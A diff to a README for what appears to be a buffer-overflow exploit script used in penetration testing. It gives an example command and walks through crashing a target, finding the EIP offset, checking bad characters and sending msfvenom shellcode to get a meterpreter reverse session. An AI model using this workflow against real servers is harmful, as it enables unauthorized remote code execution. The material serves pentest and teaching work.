@@ -10,3 +10,5 @@ The idea is you should have your msfconsole up and exploit/multi/handler set to 
 ./exploitshadow.py 4 2006 0x11223344 10.0.0.1 443 10.0.0.10 9999
 
 In the above example, the argument "4" is the mode I am using to send the final payload to get a meterpreter session. I initially crashed the program with mode 1, then found that 2006 is the number of bytes offset to the EIP overwrite (found via modes 2 and 5), then checked for bad characters with mode 3 (00, 0a, 0d are there by default), then send the final payload with mode 4. The 0x11223344 is the theoretical memory location of a "jmp esp" command, which would hit the second nopsled directly after the EIP overwrite and continue onto the shellcode. The 10.0.0.1 and 443 are the LHOST/LPORT information fed into msfvenom. The 10.0.0.10 and 9999 are the IP address of the remote server and port we are attacking.
+
+Honestly, the coolest part about this is the fact that it gives you a date/time stamp of when the payload is sent at the very end, because we are pentesters and the report is what matters to the client, right???
